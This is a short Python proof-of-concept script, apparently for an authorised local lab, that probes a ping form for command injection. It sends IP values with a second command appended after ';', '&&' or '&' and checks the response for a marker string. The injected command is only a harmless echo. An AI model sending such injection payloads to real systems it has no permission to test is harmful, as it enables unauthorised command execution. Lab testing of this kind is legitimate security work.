#!/usr/bin/env python3
'''CMD-001 命令注入候选 POC 草案（授权本地靶场，未运行）。'''

import argparse
import pathlib

import requests

MARKER = 'LAB_POC_MARKER_7f3a'

PAYLOADS = {
    'linux': [
        {'label': 'baseline', 'ip': '127.0.0.1'},
        {'label': 'semicolon', 'ip': '127.0.0.1; echo ' + MARKER},
        {'label': 'and', 'ip': '127.0.0.1 && echo ' + MARKER},
    ],
    'windows': [
        {'label': 'baseline', 'ip': '127.0.0.1'},
        {'label': 'amp', 'ip': '127.0.0.1 & echo ' + MARKER},
        {'label': 'double_amp', 'ip': '127.0.0.1 && echo ' + MARKER},
    ],
}


def load_cookie(path):
    raw = pathlib.Path(path).read_text(encoding='utf-8').strip()
    if '=' in raw:
        cookies = {}
        for part in raw.split(';'):
            if '=' in part:
                name, value = part.split('=', 1)
                cookies[name.strip()] = value.strip()
        return cookies
    return {'PHPSESSID': raw}


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', required=True)
    parser.add_argument('--os', choices=['linux', 'windows'], required=True)
    parser.add_argument('--cookie-file', required=True)
    parser.add_argument('--timeout', type=float, default=10.0)
    args = parser.parse_args()

    session = requests.Session()
    session.cookies.update(load_cookie(args.cookie_file))

    for item in PAYLOADS[args.os]:
        data = {'ip': item['ip'], 'Submit': 'Submit'}
        try:
            resp = session.post(args.url, data=data, timeout=args.timeout, allow_redirects=False)
        except requests.RequestException as exc:
            print('[ERROR] {0} {1!r}: {2}'.format(item['label'], item['ip'], exc))
            continue
        body = resp.text
        lowered = body.lower()
        ping_seen = ('bytes from' in lowered) or ('ttl=' in lowered) or ('time=' in lowered)
        print('--- {0} ip={1!r} status={2}'.format(item['label'], item['ip'], resp.status_code))
        print('normal_ping_output_seen={0}'.format(ping_seen))
        print('extra_marker_seen={0}'.format(MARKER in body))


if __name__ == '__main__':
    main()
